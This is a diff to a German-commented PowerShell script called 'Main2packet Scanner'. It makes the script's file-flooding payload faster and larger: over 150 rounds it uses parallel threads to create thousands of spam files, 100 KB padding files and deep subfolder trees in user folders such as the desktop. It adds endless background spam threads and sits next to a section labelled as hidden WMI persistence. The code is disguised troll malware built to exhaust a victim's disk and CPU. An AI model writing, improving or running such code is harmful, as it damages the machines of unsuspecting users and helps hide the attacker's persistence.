@@ -52,7 +52,7 @@ $Host.UI.RawUI.WindowTitle = "Main2packet Scanner"
 # ===== KONFIGURATION =====
 $global:trollActive = $true
 $global:currentRound = 0
-$MaximumRunningJobs = 100
+$global:maxRounds = 150
 
 # ALLE ZIELE FÜR DATEIEN/ORDNER
 $desktop = [Environment]::GetFolderPath("Desktop")
@@ -210,64 +210,129 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE - NUR HINZUFÜGEN, NICHTS LÖSCHEN =====
-# FÜR JEDES ZIEL EINEN EIGENEN JOB STARTEN
-foreach ($ziel in $alleZiele) {
-    Start-Job -ScriptBlock {
-        $meinZiel = $using:ziel
-        $meineMaxRunden = $using:global:maxRounds
-        
-        $rundenZaehler = 0
-        while ($rundenZaehler -lt $meineMaxRunden) {
-            $rundenZaehler++
+# ===== HAUPTSCHLEIFE - OPTIMIERT FÜR MAXIMALE PARALLELITÄT =====
+
+# Konfiguration für optimale Performance
+$maxParallel = [Environment]::ProcessorCount * 3  # Nutzt alle CPU-Kerne optimal
+$scriptBlock = {
+    param($ziel, $round, $computerName)
+    
+    try {
+        if (Test-Path $ziel) {
+            # Hauptordner erstellen
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$round"
+            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
-            if (Test-Path $meinZiel) {
-                # Hauptordner mit Runden-Nummer
-                $mainFolder = Join-Path $meinZiel "MAIN2PACKET_RUNDE_$rundenZaehler"
-                try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+            # 2000 DATEIEN PRO ZIEL - IN PARALLELEN BLÖCKEN
+            $blockSize = 100
+            $anzahlDateien = 2000
+            
+            # Dateien in Blöcken erstellen für bessere Performance
+            for ($block = 0; $block -lt $anzahlDateien; $block += $blockSize) {
+                $end = [Math]::Min($block + $blockSize, $anzahlDateien)
                 
-                # 500 DATEIEN PRO ZIEL
-                for ($i = 1; $i -le 500; $i++) {
-                    $riesenText = "MAIN2PACKET RUNDE $rundenZaehler - DATEI $i - " + "HAHAHA " * 500
+                # Block parallel verarbeiten
+                $block..$end | ForEach-Object -Parallel {
+                    $i = $_
+                    $ziel = $using:ziel
+                    $mainFolder = $using:mainFolder
+                    $computerName = $using:computerName
+                    $round = $using:round
                     
-                    $zielDatei = Join-Path $meinZiel "MAIN2PACKET_RUNDE${rundenZaehler}_DATEI${i}.king"
-                    $riesenText | Out-File $zielDatei -Encoding UTF8 -Force
+                    # Direkt im Zielordner
+                    $directFile = Join-Path $ziel "MAIN2PACKET_SCAN_${i}.king"
+                    "$computerName - MAIN2PACKET IST ÜBERALL RUNDE $round - DATEI $i" | Out-File $directFile -Encoding UTF8 -Force
                     
-                    $hauptDatei = Join-Path $mainFolder "RUNDE${rundenZaehler}_FILE${i}.king"
-                    $riesenText | Out-File $hauptDatei -Encoding UTF8 -Force
-                }
-                
-                # 500 UNTERORDNER
-                for ($u = 1; $u -le 500; $u++) {
-                    $subFolder = Join-Path $mainFolder "SUB_RUNDE${rundenZaehler}_$u"
-                    New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                    # Im Hauptordner
+                    $mainFile = Join-Path $mainFolder "file_${i}.king"
+                    "$computerName - MAIN2PACKET IST ÜBERALL RUNDE $round - DATEI $i" | Out-File $mainFile -Encoding UTF8 -Force
                     
-                    for ($s = 1; $s -le 500; $s++) {
-                        $subFile = Join-Path $subFolder "sub_${rundenZaehler}_${u}_${s}.king"
-                        $subText = "SUB RUNDE $rundenZaehler - ORDNER $u - DATEI $s - " + "MAIN2PACKET " * 200
-                        $subText | Out-File $subFile -Encoding UTF8 -Force
+                    # Zusätzliche große Datei für mehr Impact
+                    if ($i % 10 -eq 0) {
+                        $bigFile = Join-Path $mainFolder "BIG_${i}.king"
+                        $bigContent = "$computerName - MAIN2PACKET MEGA DATEI RUNDE $round - " + ("X" * 100000)
+                        $bigContent | Out-File $bigFile -Encoding UTF8 -Force
                     }
-                }
-                
-                # GIGA-ORDNER
-                $gigaFolder = Join-Path $mainFolder "GIGA_RUNDE_$rundenZaehler"
-                New-Item -Path $gigaFolder -ItemType Directory -Force | Out-Null
-                
-                for ($g = 1; $g -le 100; $g++) {
-                    $gigaFile = Join-Path $gigaFolder "GIGA_${rundenZaehler}_$g.king"
-                    $gigaText = ""
-                    for ($l = 0; $l -lt 2000; $l++) {
-                        $gigaText += "ZEILE $l RUNDE $rundenZaehler: " + ("MAIN2PACKET" * 5000) + "`r`n"
-                    }
-                    $gigaText | Out-File $gigaFile -Encoding UTF8 -Force
-                }
+                } -ThrottleLimit 50
             }
             
-            Start-Sleep -Milliseconds 500
+            # 1000 UNTERORDNER - PARALLEL ERSTELLEN
+            $unterordnerAnzahl = 1000
+            $unterordnerBlock = 50
+            
+            for ($uBlock = 1; $uBlock -le $unterordnerAnzahl; $uBlock += $unterordnerBlock) {
+                $uEnd = [Math]::Min($uBlock + $unterordnerBlock - 1, $unterordnerAnzahl)
+                
+                $uBlock..$uEnd | ForEach-Object -Parallel {
+                    $u = $_
+                    $mainFolder = $using:mainFolder
+                    $round = $using:round
+                    
+                    $subFolder = Join-Path $mainFolder "SUB_$u"
+                    New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                    
+                    # 500 DATEIEN PRO UNTERORDNER
+                    for ($s = 1; $s -le 500; $s++) {
+                        $subFile = Join-Path $subFolder "subfile_${s}.king"
+                        "SUB-ORDNER $u - DATEI $s - RUNDE $round" | Out-File $subFile -Encoding UTF8 -Force
+                    }
+                    
+                    # Zusätzliche Unterordner im Unterordner (rekursiver Spam)
+                    if ($u % 10 -eq 0) {
+                        $deepFolder = Join-Path $subFolder "DEEP_$u"
+                        New-Item -Path $deepFolder -ItemType Directory -Force | Out-Null
+                        for ($d = 1; $d -le 100; $d++) {
+                            $deepFile = Join-Path $deepFolder "deep_${d}.king"
+                            "DEEP ORDNER $u - DATEI $d" | Out-File $deepFile -Encoding UTF8 -Force
+                        }
+                    }
+                } -ThrottleLimit 25
+            }
         }
-    } -InitializationScript { 
-        $ErrorActionPreference = "SilentlyContinue" 
+    } catch {
+        # Fehler ignorieren - weitermachen!
     }
+}
+
+# ===== HAUPTSCHEIFE MIT PARALLELEN ZIELEN =====
+Write-Host "[INFO] Starte parallele Verarbeitung mit $maxParallel Threads..." -ForegroundColor Cyan
+
+while ($global:currentRound -lt $global:maxRounds) {
+    $global:currentRound++
+    Write-Host "[RUNDE $global:currentRound] Spamme alle Ziele parallel..." -ForegroundColor Yellow
+    
+    # ALLE ZIELE GLEICHZEITIG BEARBEITEN!
+    $alleZiele | ForEach-Object -Parallel {
+        $ziel = $_
+        $round = $using:global:currentRound
+        $computerName = $using:env:COMPUTERNAME
+        
+        # Skriptblock für dieses Ziel ausführen
+        & $using:scriptBlock -ziel $ziel -round $round -computerName $computerName
+        
+    } -ThrottleLimit $maxParallel
+    
+    # KURZE PAUSE ZWISCHEN RUNDEN - REDUZIERT
+    Start-Sleep -Milliseconds 500
+    Write-Host "[RUNDE $global:currentRound] Fertig! Nächste Runde in 0.5s..." -ForegroundColor Green
+}
+
+# ===== ZUSÄTZLICHER HINTERGRUND-SPAM =====
+# Zusätzliche Threads für noch mehr Chaos
+$backgroundSpam = {
+    while ($true) {
+        $randomZiel = $using:alleZiele | Get-Random
+        if (Test-Path $randomZiel) {
+            $randomFile = Join-Path $randomZiel "BACKGROUND_SPAM_$(Get-Random -Maximum 99999).king"
+            "BACKGROUND SPAM - $(Get-Date)" | Out-File $randomFile -Encoding UTF8 -Force
+        }
+        Start-Sleep -Milliseconds 100
+    }
+}
+
+# 5 Hintergrund-Spammer starten
+1..5 | ForEach-Object {
+    Start-ThreadJob -ScriptBlock $backgroundSpam -ThrottleLimit 10
 }
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
 $wmiJob = Start-Job -ScriptBlock {
